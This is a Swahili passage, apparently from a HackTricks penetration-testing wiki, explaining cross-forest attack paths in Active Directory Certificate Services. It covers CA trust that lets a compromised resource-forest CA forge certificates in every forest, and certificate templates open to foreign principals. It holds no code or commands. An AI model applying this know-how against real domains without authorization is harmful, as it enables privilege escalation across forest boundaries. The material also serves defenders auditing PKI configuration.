Mipangilio ya **kujiandikisha kwa msitu wa kuvuka** imefanywa kuwa rahisi. **Cheti cha CA cha mzizi** kutoka msitu wa rasilimali **kimechapishwa kwa misitu ya akaunti** na wasimamizi, na **vyeti vya CA ya biashara** kutoka msitu wa rasilimali **vimeongezwa kwenye `NTAuthCertificates` na vyombo vya AIA katika kila msitu wa akaunti**. Ili kufafanua, mpangilio huu unampa **CA katika msitu wa rasilimali udhibiti kamili** juu ya misitu mingine yote ambayo inasimamia PKI. Ikiwa CA hii itakuwa **imevunjwa na washambuliaji**, vyeti vya watumiaji wote katika misitu ya rasilimali na akaunti vinaweza **kutengenezwa na wao**, hivyo kuvunja mpaka wa usalama wa msitu.

### Haki za Kujiandikisha Zilizotolewa kwa Wakuu wa Kigeni

Katika mazingira ya misitu mingi, tahadhari inahitajika kuhusu CAs za Biashara ambazo **zinachapisha mifano ya vyeti** ambayo inaruhusu **Watumiaji Waliothibitishwa au wakuu wa kigeni** (watumiaji/vikundi vya nje ya msitu ambao CA ya Biashara inahusisha) **haki za kujiandikisha na kuhariri**.\
Baada ya uthibitisho kupitia imani, **SID ya Watumiaji Waliothibitishwa** inaongezwa kwenye token ya mtumiaji na AD. Hivyo, ikiwa kikoa kina CA ya Biashara yenye mfano ambao **unaruhusu haki za kujiandikisha kwa Watumiaji Waliothibitishwa**, mfano unaweza kuwa **ukijiandikisha na mtumiaji kutoka msitu tofauti**. Vivyo hivyo, ikiwa **haki za kujiandikisha zinatolewa wazi kwa mkuu wa kigeni na mfano**, **uhusiano wa udhibiti wa ufikiaji wa msitu wa kuvuka unaundwa**, ukimwezesha mkuu kutoka msitu mmoja **kujiandikisha katika mfano kutoka msitu mwingine**.

Mifano yote inasababisha **kuongezeka kwa uso wa shambulio** kutoka msitu mmoja hadi mwingine. Mipangilio ya mfano wa cheti inaweza kutumika na mshambuliaji kupata haki za ziada katika kikoa cha kigeni.


## Marejeo

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)

{{#include ../../../banners/hacktricks-training.md}}
